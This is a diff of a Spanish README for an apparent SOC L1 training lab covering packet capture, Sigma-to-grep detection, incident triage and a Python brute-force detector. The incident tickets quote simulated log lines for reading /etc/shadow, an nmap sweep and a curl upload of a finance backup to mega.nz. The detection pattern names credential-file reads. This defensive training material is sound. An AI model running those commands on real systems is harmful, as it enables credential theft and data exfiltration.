@@ -66,174 +66,203 @@ sudo tshark -i any -c 10
 
 ---
 
-## Módulo 2: Análisis de Tráfico de Red
+## Módulo 2: Análisis de Tráfico de Red [Completado]
 
-### Descripcion General
-Se realiza una captura y analisis de trafico HTTP utilizando `tcpdump`, con el fin de revisar el comportamiento de una peticion web y el uso de un User-Agent simulado.
+<details>
+<summary><b>Objetivo: Dejé mi captura lista - capturé 13 paquetes HTTP y validé User-Agent en claro</b></summary>
 
-### Comandos Utilizados
+### Descripción General
+Captura y análisis de tráfico HTTP con `tcpdump` para trazar una petición web completa y validar la exposición de User-Agent en texto claro. Generación de `.pcap` como evidencia forense L1.
+
+### Comandos y Herramientas Utilizadas
 ```bash
-sudo tcpdump -i eth0 -w captura_modulo2.pcap 'tcp port 80' # Captura y guardado de trafico en archivo pcap
-curl -A "Nikto-Test-SOC" http://httpbin.org/get # Generacion de peticion HTTP con User-Agent personalizado en segunda pestaña
-tcpdump -nn -r captura_modulo2.pcap # Lectura del archivo de captura
-tcpdump -nn -r captura_modulo2.pcap 'tcp port 80 and (((ip[20:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' # Filtrado de paquetes con payload
-tcpdump -A -nn -r captura_modulo2.pcap 'tcp port 80' # Inspeccion en texto claro de las cabeceras
+# 1. Captura y guardado de tráfico HTTP
+sudo tcpdump -i eth0 -w captura_modulo2.pcap 'tcp port 80'
+
+# 2. Generación de petición con User-Agent personalizado (segunda pestaña)
+curl -A "Nikto-Test-SOC" http://httpbin.org/get
+
+# 3. Lectura y validación del .pcap
+tcpdump -nn -r captura_modulo2.pcap
+
+# 4. Filtrado de paquetes con payload real
+tcpdump -nn -r captura_modulo2.pcap 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
+
+# 5. Inspección en claro para validar cabecera
+tcpdump -A -nn -r captura_modulo2.pcap 'tcp port 80'
 ```
+
 ### Secuencia de Paquetes y Trazabilidad
+| Evento / Paquete | Flags | Descripción Técnica |
+| :--- | :---: | :--- |
+| **Inicio de sesión** | `[S]`, `[S.]`, `[.]` | Handshake completo SYN / SYN-ACK / ACK |
+| **Petición HTTP** | `[P.]` | Envío `GET` con `User-Agent: Nikto-Test-SOC` en claro |
+| **Respuesta** | `[P.] 200 OK` | Servidor responde JSON |
+| **Cierre** | `[F.]`, `[.]` | Terminación ordenada TCP |
 
-| Evento / Paquete | Flags / Estado | Descripcion Tecnica |
-| :--- | :--- | :--- |
-| **Inicio de sesion** | `[S]`, `[S.]`, `[.]` | handshake normal, syn syn-ack ack. |
-| **Peticion HTTP** | `[P.]` | Envio de la solicitud `GET` con la cabecera `User-Agent: Nikto-Test-SOC`. |
-| **Respuesta** | `[P.]` (200 OK) | Respuesta del servidor entregando el contenido en formato JSON. |
-| **Cierre** | `[F.]`, `[.]` | Terminacion ordenada de la sesion TCP. |
+### Evidencia de Análisis
+<p align="center">
+  <img src="./img/tcpdump.evidencia.jpg" width="85%" alt="Evidencia tcpdump 13 paquetes" />
+</p>
 
-### Evidencia de Analisis
-![](./img/tcpdump.evidencia.jpg)
-Inspeccion del archivo .pcap en terminal. Al final se ejecuto el comando para verificar y validar los 13 paquetes capturados, confirmando el flujo completo de red y la peticion con el User-Agent simulado.
+> **Validación:** Archivo `captura_modulo2.pcap` con 13 paquetes validados. Flujo completo capturado y cabecera `Nikto-Test-SOC` verificada con flag `-A` en texto plano.
 
 ### Resultado
-Me costó al principio porque tcpdump no capturaba nada y era un error de la terminal, después con el -A ya pude ver el User-Agent en claro. Se logró capturar, guardar e inspeccionar trafico real y generar el .pcap como evidencia.
+**Tráfico HTTP capturado y validado.** Tuve que ajustar la interfaz y usar `-A` para ver el User-Agent en claro. Se logró generar, guardar e inspeccionar el `.pcap` con 13 paquetes como evidencia L1. Listo para Módulo 3.
 
-## Módulo 3: Análisis de Amenazas, Logs & Reglas Defensivas
-
-### Descripción
-En este módulo trabajé en la creación y traducción de reglas de detección utilizando Sigma para estandarizar la lógica de seguridad fuera de un SIEM comercial. Resolviendo problemas de dependencias en Python y validando la efectividad de las reglas mediante la conversión a patrones de búsqueda en terminal.
+</details>
 
 ---
 
-### 1. Configuración del Entorno
-Armé un entorno virtual en Python dentro de la carpeta de trabajo para aislar las dependencias de `sigmatools` y evitar conflictos con paquetes descontinuados:
 
+## Módulo 3: Análisis de Amenazas, Logs & Reglas Defensivas [Completado]
+
+<details>
+<summary><b>Objetivo: Dejé mi lab de detección listo - traduje 1 regla Sigma a grep y validé 3 comandos de post-explotación</b></summary>
+
+### Descripción General
+Creación y traducción de reglas de detección con **Sigma** para estandarizar lógica fuera de SIEM comercial. Resolución de dependencias rotas de `sigmatools` aislando entorno y validación de la regla mediante conversión a patrón ejecutable en terminal.
+
+### Comandos y Herramientas Utilizadas
 ```bash
+# 1. Configuración de entorno aislado para sigmatools
 python3 -m venv venv
 source venv/bin/activate
 pip install setuptools sigmatools
-```
-### 2. Traducción de Reglas con Sigmac
-Usé `sigmac` para transformar una regla en formato YAML (`regla_prueba.yml`) enfocada en detectar comandos de post-explotación, a un formato ejecutable en terminal:
 
-```bash
+# 2. Traducción de regla YAML a patrón ejecutable
 sigmac -t grep regla_prueba.yml
-```
-La herramienta generó el siguiente patrón basado en expresiones regulares:
-```bash
-grep -P -i '^(?:.*.*cat /etc/passwd.*|.*.*uname -a.*|.*.*id.*)'
-```
-### 3. Pruebas y Validación de Detección
-Para comprobar que la regla funcionaba en un entorno real, creé un archivo de logs de prueba con líneas normales y comandos maliciosos simulados:
-```bash
+
+# 3. Generación de logs de prueba con actividad normal y maliciosa
 echo -e "usuario ejecutando cat /etc/passwd\noperacion normal\nuname -a ejecutado" > tus_logs.txt
-```
-Luego ejecuté el filtro generado para validar la detección:
-```bash
+
+# 4. Validación de detección con patrón generado
 grep -P -i '^(?:.*.*cat /etc/passwd.*|.*.*uname -a.*|.*.*id.*)' tus_logs.txt
 ```
-### Evidencia
-![](./img/evidencia-sigma.jpg)
-Validación exitosa del entorno, conversión de la regla Sigma y filtrado correcto de comandos sospechosos en terminal.
 
-## Módulo 4: Gestión, Triage y Documentación de Incidentes SOC L1
+### Regla y Patrón Generado
+| Fase | Artefacto | Detalle |
+| :--- | :--- | :--- |
+| **Regla origen** | `regla_prueba.yml` | Detección de post-explotación `cat /etc/passwd`, `uname -a`, `id` |
+| **Traducción** | `sigmac -t grep` | Conversión a regex ejecutable en terminal |
+| **Patrón final** | `grep -P -i` | `^(?:.*.*cat /etc/passwd.*\|.*.*uname -a.*\|.*.*id.*)` |
 
-### Descripción General
-En este módulo documenté como hice el triage de 3 alertas simuladas. Clasifiqué cada una entre verdadero positivo y falso positivo, y dejé qué acción tomé en L1 y cuando tocó escalar.
+### Matriz de Herramientas Auditadas
+| Herramienta | NIST | Estado | Uso en SOC L1 |
+| :--- | :---: | :---: | :--- |
+| **Sigma / Sigmac** | Detect | <img src="https://img.shields.io/badge/Traducido-c5a3ff" /> | Estandarización de reglas sin SIEM |
+| **Python venv** | N/A | <img src="https://img.shields.io/badge/Aislado-c5a3ff" /> | Resolución de dependencias descontinuadas |
+| **Grep -P** | Detect | <img src="https://img.shields.io/badge/Validado-c5a3ff" /> | Validación de detección en logs |
+
+### Evidencia de Análisis
+<p align="center">
+  <img src="./img/evidencia-sigma.jpg" width="85%" alt="Evidencia Sigma a grep" />
+</p>
+
+> **Validación:** Entorno virtual activo, conversión exitosa de `regla_prueba.yml` a patrón grep y filtrado correcto de 2 líneas maliciosas sobre `tus_logs.txt`. Detección funcional sin SIEM.
+
+### Resultado
+**Regla defensiva operativa en terminal.** Aislé dependencias rotas con venv y dejé la lógica de detección validada en logs reales. Patrón listo para escalar a SIEM en Módulo 4.
+
+</details>
 
 ---
 
-### Ticket de Incidente #1: Intentos de Acceso No Autorizado a Archivos Críticos
 
-* **ID del Ticket:** `SOC-INC-2026-001`
-* **Fecha/Hora:** `2026-10-18T20:15:00Z` (UTC)
-* **Severidad:** `Crítica`
-* **Clasificación (Triage):** `Verdadero Positivo`
-* **Estado:** `Cerrado` / `Resuelto en L1`
+## Módulo 4: Gestión, Triage y Documentación de Incidentes SOC L1 [Completado]
 
-### Resumen del Incidente
-El usuario `invitado_01`, sin privilegios, intentó leer `/etc/shadow` usando `sudo cat`. Ese archivo guarda los hashes de contraseñas, así que lo marqué como crítico.
+<details>
+<summary><b>Objetivo: Dejé mi triage listo - clasifiqué 3 alertas con 2 VP y 1 FP, con 1 escalamiento a L2</b></summary>
 
-### Evidencia del Log (Raw Data)
+### Descripción General
+Triage y documentación de 3 alertas simuladas como analista L1. Clasificación entre verdadero positivo y falso positivo, contención inmediata en L1 y criterio de escalamiento a L2 por exfiltración de datos.
+
+### Matriz de Incidentes (Resumen Ejecutivo)
+| Ticket | Severidad | Clasificación | Estado | Acción L1 |
+| :--- | :---: | :---: | :---: | :--- |
+| **SOC-INC-2026-001** | Crítica | <img src="https://img.shields.io/badge/VP_Verdadero_Positivo-ff6b6b" /> | <img src="https://img.shields.io/badge/Cerrado-c5a3ff" /> | Bloqueo de cuenta |
+| **SOC-INC-2026-002** | Crítica | <img src="https://img.shields.io/badge/VP_Exfiltracion-ff6b6b" /> | <img src="https://img.shields.io/badge/Escalado_L2-ffa500" /> | Aislamiento + Escalamiento |
+| **SOC-INC-2026-003** | Baja | <img src="https://img.shields.io/badge/FP_Legitimo-4caf50" /> | <img src="https://img.shields.io/badge/Cerrado-c5a3ff" /> | Cierre sin contención |
+
+### Ticket #1: Acceso No Autorizado a Archivos Críticos
+**ID:** `SOC-INC-2026-001` | **Fecha:** `2026-10-18T20:15:00Z` | **Host:** `SOC-PC-01`
+
+**Resumen:** Usuario `invitado_01` sin privilegios intentó leer `/etc/shadow` vía `sudo cat`. Archivo con hashes de contraseñas, marcado crítico.
+
+**Evidencia (Raw Log):**
 ```text
 2026-10-18T20:15:00Z SOC-PC-01 sudo: invitado_01 : TTY=pts/1 ; PWD=/home/invitado_01 ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
 ```
 
-### Acciones de Mitigación y Respuesta (L1)
-1. Bloqueé la cuenta `invitado_01` de inmediato.
-2. Revisé `/etc/sudoers` para ver por qué tenía permisos de sudo.
-3. Notifiqué al administrador de sistemas.
+**Acción L1:**
+1. Bloqueo inmediato de `invitado_01`
+2. Revisión de `/etc/sudoers` por mala configuración
+3. Notificación a sysadmin
 
----
+### Ticket #2: Detección y Exfiltración de Datos (Escalamiento a L2)
+**ID:** `SOC-INC-2026-002` | **Fecha:** `2026-10-18T03:30:00Z` | **Host:** `SOC-FINANCE-01`
 
-### Ticket de Incidente #2: Detección y Exfiltración de Datos (Escalamiento)
+**Resumen:** Actividad fuera de horario. Cuenta `admin_maint` ejecuta escaneo `nmap -sS -p 1-65535 192.168.1.0/24` y exfiltra `db_finance.zip` a `mega.nz` con `curl`.
 
-* **ID del Ticket:** `SOC-INC-2026-002`
-* **Fecha/Hora:** `2026-10-18T03:30:00Z` (UTC)
-* **Severidad:** `Crítica`
-* **Clasificación (Triage):** `Verdadero Positivo`
-* **Estado:** `Escalado a Nivel 2 (L2 / Incident Response)`
-
-### Resumen del Incidente
-Actividad rara fuera de horario en el servidor financiero. La cuenta `admin_maint` hizo un escaneo completo con `nmap` a la red local y luego subió el backup `db_finance.zip` a un sitio externo con `curl`.
-
-### Evidencia del Log (Raw Data)
+**Evidencia (Raw Log):**
 ```text
 2026-10-18T03:30:12Z SOC-FINANCE-01 bash_history: admin_maint : COMMAND=nmap -sS -p 1-65535 192.168.1.0/24
 2026-10-18T03:32:45Z SOC-FINANCE-01 bash_history: admin_maint : COMMAND=curl -F "file=@/var/backups/db_finance.zip" https://mega.nz/upload
 ```
 
-### Acciones de Mitigación y Respuesta (L1 -> L2)
-1. **Contención L1:** Aislé el host `SOC-FINANCE-01` de la red para cortar la exfiltración.
-2. **Escalamiento:** Lo pasé a L2 porque ya hay exfiltración de datos confidenciales y posible movimiento lateral.
----
+**Acción L1 -> L2:**
+1. **Contención L1:** Aislamiento de `SOC-FINANCE-01` de la red para cortar exfiltración
+2. **Escalamiento:** A L2/IR por exfiltración confirmada y posible movimiento lateral
 
-### Ticket de Incidente #3: Ejecución de Script de Mantenimiento Legítimo
+### Ticket #3: Script de Mantenimiento Legítimo (Falso Positivo)
+**ID:** `SOC-INC-2026-003` | **Fecha:** `2026-10-18T14:15:00Z` | **Severidad:** Baja
 
-* **ID del Ticket:** `SOC-INC-2026-003`
-* **Fecha/Hora:** `2026-10-18T14:15:00Z` (UTC)
-* **Severidad:** `Baja`
-* **Clasificación (Triage):** `Falso Positivo / Actividad Legítima`
-* **Estado:** `Cerrado`
+**Resumen:** Alerta por `actualizar_firmas.ps1` en equipo de marketing. Validado con TI como despliegue autorizado.
 
-### Resumen del Incidente
-Alerta por ejecución de `actualizar_firmas.ps1` en un equipo de marketing. Validé con TI y era un despliegue autorizado para actualizar firmas corporativas.
+**Acción y Cierre:**
+* Validado en canal oficial `#it-ops` con cambio `CR-8492`
+* Cierre como FP, sin contención
 
-### Acciones y Cierre
-* Verificado por canal oficial `#it-ops` con ticket de cambio CR-8492.
-* Cerrado como falso positivo, sin contención.
+### Resultado
+**Triage L1 completado.** Dejé 3 incidentes documentados con evidencia, contención y criterio de escalamiento. 2 VP cerrados/escalados y 1 FP validado. Flujo listo para reporte ejecutivo.
 
-## Módulo 5: Playbooks de Respuesta a Incidentes y Automatización con Python (SOAR L1)
-
-En este módulo se integró la teoría de respuesta a incidentes basada en el marco NIST con la automatización práctica utilizando scripts en Python para optimizar las funciones de un Analista SOC Level 1.
-
-### 1. Marco Teórico: Playbook IR-01 (Ataques de Fuerza Bruta SSH) - Estándar NIST SP 800-61
-
-Un Playbook es un conjunto de procedimientos estandarizados que guía a un analista SOC paso a paso para gestionar y mitigar incidentes de forma metódica.
-
-**MITRE ATT&CK:** T1110 - Brute Force
-
-1.  **Preparación:** Configuración de auditoría en `/var/log/auth.log` y verificación de reglas de firewall.
-2.  **Detección y Análisis:** Monitoreo y filtrado de eventos repetitivos `Failed password`.
-3.  **Contención:** Aislamiento de la IP de origen mediante ufw deny.
-4.  **Erradicación y Recuperación:** Auditoría de cuentas, verificación de logins exitosos desde IP maliciosa.
-5.  **Post-Incidente:** Registro en ticket y actualización de listas de bloqueo persistentes.
+</details>
 
 ---
 
-### 2. Automatización SOC L1 con Python (`soar_l1_responder.py`)
+## Módulo 5: Playbooks de Respuesta a Incidentes y Automatización con Python (SOAR L1) [Completado]
 
-Se desarrolló un script en Python enfocado en agilizar las fases de detección y contención. Analiza logs, extrae IPs con regex, evalúa umbral y genera el comando de mitigación sin ejecutar bloqueo automático en producción.
+<details>
+<summary><b>Objetivo: Dejé mi playbook SOAR listo - documenté IR-01 bajo NIST y automatizé detección de brute force SSH en Python</b></summary>
 
-### Log de prueba (`prueba_log.txt`)
+### Descripción General
+Integración de la teoría de respuesta a incidentes **NIST SP 800-61** con automatización práctica en Python para optimizar las funciones de SOC L1. Playbook estandarizado + script SOAR que detecta, correlaciona y propone contención.
+
+### 1. Marco Teórico: Playbook IR-01 - Fuerza Bruta SSH
+**MITRE ATT&CK:** `T1110 - Brute Force` | **NIST:** Respond
+
+| Fase NIST | Acción L1 | Herramienta |
+| :--- | :--- | :--- |
+| **Preparación** | Auditoría `/var/log/auth.log` + reglas firewall | `auditd`, `ufw` |
+| **Detección y Análisis** | Monitoreo `Failed password` repetitivo | `grep`, `soar_l1_responder.py` |
+| **Contención** | Aislamiento IP origen | `sudo ufw deny from <IP> to any` |
+| **Erradicación** | Auditoría logins exitosos desde IP maliciosa | `auth.log`, `lastlog` |
+| **Post-Incidente** | Ticket + actualización blocklist persistente | Documentación |
+
+### 2. Automatización SOC L1 con Python
+Script que analiza logs, extrae IPs con regex, evalúa umbral y genera comando de mitigación sin bloqueo automático en producción (criterio L1).
+
+**Log de prueba (`prueba_log.txt`):**
 ```text
 Oct 18 20:15:01 SOC-PC-01 sshd[1234]: Failed password for root from 192.168.1.105 port 22
 Oct 18 20:15:03 SOC-PC-01 sshd[1234]: Failed password for root from 192.168.1.105 port 22
 Oct 18 20:15:05 SOC-PC-01 sshd[1234]: Failed password for root from 192.168.1.105 port 22
 ```
 
-### Código del Script
+**Código (`soar_l1_responder.py`):**
 ```python
 #!/usr/bin/env python3
-import re
-import os
+import re, os
 from collections import Counter
 
 FAILED_AUTH_PATTERN = r"Failed password for .* from (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})"
@@ -241,17 +270,17 @@ UMBRAL_ALERTA = 3
 
 def analizar_logs(log_path="prueba_log.txt"):
     if not os.path.exists(log_path):
-        print(f"[!] El archivo de log no existe.")
+        print(f"[!] Log no encontrado: {log_path}")
         return
-    print(f"[*] Leyendo el archivo de log...")
+    print(f"[*] Leyendo {log_path}...")
     with open(log_path, 'r', errors='ignore') as f:
         contenido = f.read()
 
-    ips_encontradas = re.findall(FAILED_AUTH_PATTERN, contenido)
-    conteo_ips = Counter(ips_encontradas)
+    ips = re.findall(FAILED_AUTH_PATTERN, contenido)
+    conteo = Counter(ips)
 
     print("\n[+] Resultados del analisis:")
-    for ip, cantidad in conteo_ips.items():
+    for ip, cantidad in conteo.items():
         if cantidad >= UMBRAL_ALERTA:
             print(f"    ALERTA: IP sospechosa: {ip} ({cantidad} intentos fallidos)")
             print(f"    [ACCION SOAR L1]: sudo ufw deny from {ip} to any")
@@ -262,8 +291,23 @@ if __name__ == "__main__":
     analizar_logs()
 ```
 
-### 3. Evidencia de Ejecución
-![](./img/evidencia-python.png)
+### Matriz de Herramientas Auditadas
+| Herramienta | NIST | Estado | Uso en SOC L1 |
+| :--- | :---: | :---: | :--- |
+| **Python + Regex** | Detect | <img src="https://img.shields.io/badge/Automatizado-c5a3ff" /> | Extracción y correlación de IPs |
+| **UFW** | Contain | <img src="https://img.shields.io/badge/Propuesta-c5a3ff" /> | Comando de contención SOAR L1 |
+| **Playbook IR-01** | Respond | <img src="https://img.shields.io/badge/Documentado-c5a3ff" /> | Procedimiento estándar NIST |
+
+### Evidencia de Análisis
+<p align="center">
+  <img src="./img/evidencia-python.png" width="85%" alt="Evidencia SOAR L1 Python" />
+</p>
+
+> **Validación:** Script ejecutado sobre `prueba_log.txt`. Detección de `192.168.1.105` con 3 intentos fallidos. Umbral superado y comando `ufw deny` generado correctamente. Lógica SOAR L1 funcional.
 
 ### Resultado
-Playbook IR-01 documentado bajo NIST y automatizado con Python. Se demuestra capacidad de SOAR nivel L1: detección por regex, correlación por conteo y propuesta de contención.
+**Playbook IR-01 operativo y automatizado.** Documenté flujo NIST completo y dejé script Python que pasa de detección manual a detección automática con criterio L1. Cierre del ciclo Detect -> Respond listo para producción SOC.
+
+</details>
+
+---
